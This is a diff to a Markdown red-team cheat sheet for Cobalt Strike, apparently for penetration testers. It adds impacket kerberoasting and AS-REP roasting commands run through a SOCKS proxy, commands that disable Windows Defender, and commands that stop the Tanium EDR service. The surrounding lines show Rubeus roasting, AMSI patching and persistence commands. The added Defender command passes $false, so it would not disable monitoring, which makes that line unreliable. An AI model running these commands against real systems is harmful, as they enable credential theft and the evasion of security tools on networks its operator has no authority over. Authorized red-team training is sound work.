@@ -374,6 +374,15 @@ execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:lab.co
 execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com
 ```
 
+Impacket kerberoasting through SOCKS
+```
+# Target specific kerberoastable user
+proxychains impacket-GetUserSPNs -dc-ip X.X.X.X -request-user "TargetUSER" -outputfile roast-TargetUser.txt '<DOMAIN>/<USER>:<PASSWORD>'
+
+# Target all kerberoastable domain users
+proxychains impacket-GetUserSPNs -dc-ip X.X.X.X -target-domain "TargetDOMAIN" -outputfile roast-Domain.txt '<DOMAIN>/<USER>:<PASSWORD>'
+```
+
 ### AS-REP Roasting
 Target users in AD that do not require pre-authentication<br />
 ```
@@ -382,6 +391,12 @@ execute-assembly C:\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\asrep
 
 # AS-REP roast specific user with Rubeus
 execute-assembly C:\Rubeus.exe asreproast /user:testuser /format:hashcat /outfile:C:\Temp\asrep-hashes.txt
+```
+
+Impacket AS-REP roast through SOCKS
+```
+# Target specific users in 'users.txt' file
+proxychains impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip X.X.X.X '<DOMAIN>/<USER>:<PASSWORD>'
 ```
 
 ### Coercion attacks
@@ -448,6 +463,23 @@ Patch AMSI in remote process
 ### API Unhooking
 Cobalt Strike's hail-mary unhooking function. "This is a Beacon Object File to refresh DLLs and remove their hooks. The code is from Cylance's Universal Unhooking research" <br />
 `unbook`
+
+### Disabling Windows Defender
+```
+# Disable Defender via PowerShell
+powershell Set-MpPreference -DisableRealtimeMonitoring $false --> Attempt to disable Defender
+powershell Get-MpPreference --> Check if RealTimeMonitoring is disabled
+
+# Disable Defender via Windows Registry using TrustedSec Remote Operations BOFs
+reg_set HKLM "SOFTWARE\Policies\Microsoft\Windows Defender" DisableRealTimeMonitoring REG_DWORD 1
+```
+
+### Disabling Tanium 
+```
+# Disabling Tanium Client using TrustedSec Remote Operations BOFs
+sc_stop "Tanium Client" --> Attempt to disable Tanium service
+sc_qc "Tanium Client" --> Check if Tanium service disabled
+```
 
 ------------------------------------------------------------------------------------------
 ## Exploitation
@@ -660,7 +692,7 @@ execute-assembly C:\Sharpstay.exe action=CreateService servicename=TestService c
 # User registry key persistence
 execute-assembly C:\Sharpstay.exe action=UserRegistryKey keyname=Debug keypath=HKCU:Software\Microsoft\Windows\CurrentVersion\Run command="C:\Windows\temp\file.exe"
 
-# Many other methods available on the tool's github documentation
+# Many other methods available on the tool's GitHub documentation
 ```
 [SharpPersist](https://github.com/fireeye/SharPersist)
 ```
@@ -684,7 +716,7 @@ execute-assembly C:\SharPersist.exe -t service -c "C:\Windows\System32\cmd.exe" 
 
 ------------------------------------------------------------------------------------------
 # Cobalt Strike BOFs
-[My BOF Collection GitHub page](https://github.com/wsummerhill/CobaltStrike_BOF_Collections)
+[BOF_Collections.md page (above)](https://github.com/wsummerhill/C2_RedTeam_CheatSheets/blob/main/CobaltStrike/BOF_Collections.md)
 
 ### [BOF.NET](https://github.com/CCob/BOF.NET/pull/1)
 A .NET runtime tool to load assemblies in memory and avoid the typical fork-and-run model from `execute-assembly`. Use BOF.NET to run any .NET tool for better evasion by residing in your current process. Note that this will not bypass AMSI or ETW as those will have to be unhooked separately, if needed.
@@ -708,4 +740,3 @@ bofnet_executeassembly AssemblyName argument1 argument2
 [Mimikatz reference cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md) 
 
 [SpectreOps Cobalt Strike command reference](https://xzfile.aliyuncs.com/upload/affix/20190126174144-9767f9f2-214e-1.pdf) 
-
